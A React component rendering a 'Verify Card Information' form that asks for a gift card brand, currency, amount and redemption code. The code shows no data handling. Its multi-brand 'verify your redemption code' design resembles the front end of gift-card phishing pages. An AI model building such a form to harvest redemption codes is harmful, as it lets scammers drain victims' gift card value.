import React from 'react'

const VerifyCard = () => {
  return (
    <div className='flex flex-col items-center justify-center sm:w-1/2 h-1/2 sm:bg-secondary sm:rounded-xl sm:bg-opacity-50'>
      <form className='flex flex-col gap-8 w-full px-12'> 
            <span className='flex justify-center text-4xl sm:text-6xl text-primaryText font-bold'>Verify Card Information</span>
            <select name="cardType" id="card-dropdown" className='w-full h-16 p-4 rounded-xl'>
              <option defaultValue="" disabled>Select type of Card</option>
              <option value="Amazon">Amazon</option>
              <option value="American Express">American Express</option>
              <option value="Amex">Amex</option>
              <option value="Apple">Apple</option>
              <option value="discover">Discover</option>
              <option value="eBay">eBay</option>
              <option value="Nike">Nike</option>
              <option value="MasterCard">MasterCard</option>
              <option value="PlayStation">PlayStation</option>
              <option value="RazorGold">RazorGold</option>
              <option value="Sephora">Sephora</option>
              <option value="Steam">Steam</option>
              <option value="TT Visa">TT Visa</option>
              <option value="Vanilla Visa">Vanilla Visa</option>
              <option value="Visa Silvery White">Visa Silvery White</option>
              <option value="Wallmart Visa">Wallmart Visa</option>
              <option value="Xbox">Xbox</option>
            </select>
            <div className='w-full flex gap-4'>
              <select name="currency" id="card-dropdown" className='w-1/4 h-16 p-4 rounded-xl'>
                <option value="USD">USD</option>
                <option value="AUD">AUD</option>
                <option value="CAD">CAD</option>
                <option value="EUR">EUR</option>
                <option value="GBP">GBP</option>
              </select>
              <input type='text' placeholder='Card Amount' className='w-9/12 h-16 p-4 rounded-xl' required/>
            </div>
            <input type='text' placeholder='Redemption Code' className='w-full h-16 p-4 rounded-xl' required/>
            <button className=' h-16 rounded-lg bg-primaryText my-4 text-white cursor-pointer flex items-center justify-center ' type='submit'>Continue</button>
      </form>
      <span className='relative bottom text-primaryText sm:text-xl'>Please Make Sure You Input The Correct Details  </span>
    </div>
  )
}

export default VerifyCard